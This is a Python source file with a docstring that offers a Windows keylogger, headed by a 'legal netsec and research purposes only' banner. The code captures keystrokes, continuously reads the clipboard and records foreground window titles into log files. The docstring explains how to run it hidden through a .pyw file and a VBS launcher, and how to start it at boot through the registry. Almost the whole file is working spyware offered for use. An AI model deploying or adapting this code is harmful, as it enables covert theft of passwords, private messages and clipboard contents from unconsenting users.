"""
++++++++++++++++++++++++++++++++++[THIS IS FOR LEGAL NETSEC AND RESEARCH PURPOSES ONLY]+++++++++++++++++++++++++++++++++

Requirements: psutil, pyperclip, and pynput

Just a simple keylogger.
This can be run in the background without a console by saving as pyw and creating a vbs file to call it. It can be
launched at startup via regedit at local_user or local_machine levels.
In order to run out of the box, change the write_folder variable to the variable you want your logs to be written and
add two text documents in there titled 'clean_logs.txt' and 'full_logs.txt' and it is ready to be run after installing
the dependencies.
The program will not write anything to the log unless it is correctly ended by pressing ctrl+alt+enter.

Known issues:
--backspace currently will delete the last item added to the keys list even if this item is not a key.
--shutting the comp or logging off will cause the program to not write anything to the log files.
--does not currently support caps lock.
--some times the space after 'I' isn't properly pushed into the log file. I have no clue. Probably something to do with
the shift function not making proper exceptions for the Key.space.
--some key combinations have not been fully tested. E.G. I have no clue what pressing ctrl + print screen will do. This
might break the script in either an exception or a forever loop stopping keys from being captured. It shouldn't stop
the other passive listening though.

Note: if you run into issues, uncomment all of the print functions. Should help you find where the snag is being hit.

Current Features:
--realtime clipboard monitoring including pasting with ctrl+v or right-click and paste
--realtime foreground window monitoring that will display the program.exe + the window description
--captures all keys entered, including special keys (might not record some of them, but they are captured)
--delete function to keep up with what they were typing
--fully supporting shift modifier for all ASCII and special characters on a standard keyboard. If your keyboard is not
standard, you can add to the dictionary to capture shift modified keys
--uses multithreading to keep the task load pretty low, starting this in the background on my comp shows a quick cursor
load and then nothing. Compiling the log at the end does not show anything at all.

<<th3b0y1nth3gr33nh4t>>
++++++++++++++++++++++++++++++++++[THIS IS FOR LEGAL NETSEC AND RESEARCH PURPOSES ONLY]+++++++++++++++++++++++++++++++++
"""

import time
import logging
import datetime
import win32gui
import win32process
import sys
import os
import pyperclip
import psutil
from threading import Thread
from pynput.keyboard import Listener, Key

# should add a class for shift modified keys (currently type String)
# should add a class for program window description (currently type Byte)


class ClipBoardCopy:
    def __init__(self, copy):
        self.copy = copy

    def __str__(self):
        return self.copy


class ClipBoardPaste:
    def __init__(self, paste):
        self.paste = paste

    def __str__(self):
        return self.paste


class GetProgName:
    def __init__(self, name):
        self.name = name

    def __str__(self):
        return self.name


class TimeMon:
    def __init__(self, tmon):
        self.tmon = tmon

    def __str__(self):
        return self.tmon


write_folder = ''  # add the write folder
word_counts = 0
keys = []
shift = False
ctrl = False
home_end = False
alt = False
stop_threads = False
recent_value = ''
sys.path.append(os.path.abspath("SO_site-packages"))
s_key = {'a': 'A', 'b': 'B', 'c': 'C', 'd': 'D', 'e': 'E', 'f': 'F', 'g': 'G', 'h': 'H', 'i': 'I', 'j': 'J', 'k': 'K',
         'l': 'L', 'm': 'M', 'n': 'N', 'o': 'O', 'p': 'P', 'q': 'Q', 'r': 'R', 's': 'S', 't': 'T', 'u': 'U', 'v': 'V',
         'w': 'W', 'x': 'X', 'y': 'Y', 'z': 'Z', '`': '~', '1': '!', '2': '@', '3': '#', '4': '$', '5': '%', '6': '^',
         '7': '&', '8': '*', '9': '(', '0': ')', '-': '_', '=': '+', '[': '{', ']': '}', ';': ':', ',': '<', '.': '>',
         '/': '?'}


# adds log date/time title
def on_start():
    with open(write_folder + 'clean_logs.txt', 'a') as c:
        c.write('\n\n' + '------------------------------------------------' + '\n' + 'New Log Entry: ' +
                '<<' + str(datetime.datetime.now().strftime("%Y-%m-%d %H:%M")) + '>>' + '\n'
                + '------------------------------------------------' + '\n')
        c.close()
    with open(write_folder + 'full_logs.txt', 'a') as f:
        f.write('------------------------------------------------' + '\n' + 'New Log Entry: ' +
                '<<' + str(datetime.datetime.now().strftime("%Y-%m-%d %H:%M")) + '>>' + '\n' +
                '------------------------------------------------' + '\n')
        f.close()


# tracks key presses
def listen():
    global t1
    while not stop_threads:
        logging.basicConfig(filename=(write_folder + 'full_logs.txt'), level=logging.DEBUG,
                            format='%(asctime)s: %(message)s')
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()


# appends all items to the keys list in order of input
def on_press(key):
    global word_counts, keys, shift, ctrl, home_end, alt, recent_value
    if key == Key.backspace:
        try:
            # deletes items when backspace is hit. Need to alter this to be safer.                     |||MODIFY THIS|||
            print('Letter ' + str(keys[(len(keys)-1)]) + ' was removed')
            del keys[(len(keys)-1)]
        except IndexError:
            # avoids exception caused by pressing delete when nothing is in the keys list
            print('Delete was hit more times than there were items in the list.')
            pass
    elif key == Key.ctrl_l or key == Key.ctrl_r:
        # print('1')
        ctrl = True
        pass
    elif key == Key.home or key == Key.end:
        # print('2')
        home_end = True
        pass
    elif key == Key.alt_l or key == Key.alt_r:
        # print('3')
        alt = True
        pass
    elif ctrl:
        # print('4')
        if alt:
            # print('4.1')
            if key == Key.enter:
                # uses key combination ctrl+alt+enter to write everything in keys list to log and end program
                write_file(keys)
        elif str(key) == "'v'":
            # print('4.2')
            # appends type ClipBoardPaste
            new_value = ClipBoardPaste(recent_value)
            keys.append(new_value)
        else:
            pass
        pass
    elif key == Key.enter:
        # print('5')
        # appends type String
        keys.append("' |>ENTER<| '")
        print('Appending ' + str(key))
    elif key == Key.shift:
        # print('6')
        shift = True
    elif key == Key.shift_r:
        # print('7')
        shift = True
    elif shift:
        # print('8')
        if str(key) == "'\\\\'":
            # print('9')
            # appends type String (cap)
            key = str('|')
            logging.info(str(key))
            keys.append(key)
            print('Appending ' + str(key))
        elif str(key) == '"\'"':
            # print('10')
            # appends type String (cap)
            key = str('"')
            logging.info(str(key))
            keys.append(key)
            print('Appending ' + str(key))
        elif key != Key.shift and key != Key.shift_r:
            # print('11')
            try:
                if key != Key.home:
                    # print('12')
                    # appends type String (cap)
                    key = s_key[str(key).replace("'", "")]
                    key = "'" + key + "'"
                    logging.info(str(key))
                    keys.append(key)
                    print('Appending ' + str(key))
            except KeyError:
                # print('13')
                print('KeyError with shift + ' + str(key))
                pass
        else:
            # print('14')
            pass
        pass
    elif str(key) == "'\\\\'":
        # print('15')
        # appends type String
        key = str('\\')
        logging.info(str(key))
        keys.append(key)
        print('Appending ' + str(key))
    else:
        # print('16')
        # appends type Key
        logging.info(str(key))
        keys.append(key)
        print('Appending ' + str(key))


# some release checks for modifier buttons
def on_release(key):
    global shift, ctrl, home_end, alt
    if key == Key.shift or key == Key.shift_r:
        shift = False
    if key == Key.ctrl_l or key == Key.ctrl_r or key == Key.ctrl:
        ctrl = False
    if key == Key.home or key == Key.end:
        home_end = False
    if key == Key.alt_l or key == Key.alt_r:
        alt = False


# modify the Type byte from this and create a class for it
# tracks active window
def win_track():
    global stop_threads, t1
    windowTile = ""
    while not stop_threads:
        newWindowTile = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        if newWindowTile != windowTile:
            windowTile = newWindowTile
            wt_byte = windowTile.encode('UTF-8')
            hwnd = win32gui.GetForegroundWindow()
            try:
                _, pid = win32process.GetWindowThreadProcessId(hwnd)
                name = GetProgName(psutil.Process(pid).name())
            except(psutil.NoSuchProcess, ValueError):
                name = GetProgName('PID FAILED')
            if wt_byte == b'':
                pass
            else:
                # appends type GetProgName
                # appends type Byte
                print('Appending program ' + str(name))
                keys.append(name)
                keys.append(wt_byte)


# monitors clipboard for copy and paste values
def clipmon():
    global stop_threads, t3, recent_value
    while not stop_threads:
        tmp_value = pyperclip.paste()
        if tmp_value != recent_value:
            # appends type ClipBoardCopy
            recent_value = tmp_value
            print("Copied: \"%s\"" % str(recent_value)[:1000])  # can me modified to a lower amount to capture less text
            clip_apd = ClipBoardCopy(recent_value)
            keys.append(clip_apd)
        time.sleep(0.1)


# if you want to remove the timelogs, comment out the t4 sections of the daemon variables and the main function
# sends periodic (30m) time entries to the log
def time_mon():
    global t4
    time.sleep(300)  # initial time sleep is 5m, can be altered by seconds, minutes, or hours
    while not stop_threads:
        timelog = TimeMon('\n<<' + str(datetime.datetime.now().strftime("%Y-%m-%d %H:%M")) + '>>\n')
        keys.append(timelog)
        time.sleep(1800)  # wait period between timelogs is 30m, can be altered by seconds, minutes, or hours


# you need to attempt to add a function to write the file on shutdown                                  |||MODIFY THIS|||
# writes the human readable words to the clean_logs file
def write_file(key_arr):
    global shift, stop_threads
    with open(write_folder + 'clean_logs.txt', 'a') as f:
        for key in key_arr:
            if type(key) is ClipBoardCopy:
                # writes type ClipBoardCopy
                f.write('{COPIED}: ' + str(key) + '\n')
                print('Adding copied text: ' + str(key))
                continue
            elif type(key) is ClipBoardPaste:
                # writes type ClipBoardPaste
                f.write('{PASTED}: ' + str(key) + '\n')
                print('Adding pasted text: ' + str(key))
                continue
            elif type(key) is TimeMon:
                # writes type TimeMon
                f.write(str(key) + '\n')
            elif type(key) is GetProgName or isinstance(key, (bytes, bytearray)):
                # writes type GetProgName, bytes, bytearray                                            |||MODIFY THIS|||
                if type(key) is GetProgName:
                    clean_name = str(key)
                elif key == b'':
                    continue
                else:
                    pchange = key.decode('UTF-8')
                    f.write('\n------> [PROGRAM CHANGED to ' + clean_name + ' ] - <TITLE> "' + pchange + '" \n\n')
                    print('Adding ' + str(pchange))
                    continue
            elif type(key) is str:
                # writes type String (should only catch ", ENTER, and shift modified)
                if key == "'\"'":
                    f.write(key)
                    print('Adding ' + str(key))
                else:
                    f.write(key.replace("'", ""))
                    print('Adding ' + str(key))
                    continue
            elif str(key).replace("'", "").find("space") > 0:
                # writes type String from type Key (only catch space)
                f.write(' ')
                print('Adding ' + str(key))
            elif str(key).replace("'", "") == "\"\"":
                # writes type String from type Key (only catch ')
                f.write('\'')
                print('Adding ' + str(key))
            elif str(key).replace("'", "").find("Key") == -1:
                # writes type String from type Key (catchall for remainder of type Key)
                f.write(str(key).replace("'", ""))
                print('Adding ' + str(key))
        f.close()
    time.sleep(1)
    stop_threads = True


# main thread for killing the daemons
def kill():
    while not stop_threads:
        pass


# threading variables
t1 = Thread(target=win_track)
t2 = Thread(target=listen)
t3 = Thread(target=clipmon)
t4 = Thread(target=time_mon)
t5 = Thread(target=kill)  # main thread, when this dies the program ends
t1.daemon = True
t2.daemon = True
t3.daemon = True
t4.daemon = True


# begins the keylogger
def main():
    global t1, t2, t3, t4
    on_start()
    t1.start()
    t2.start()
    t3.start()
    t4.start()
    t5.start()


main()
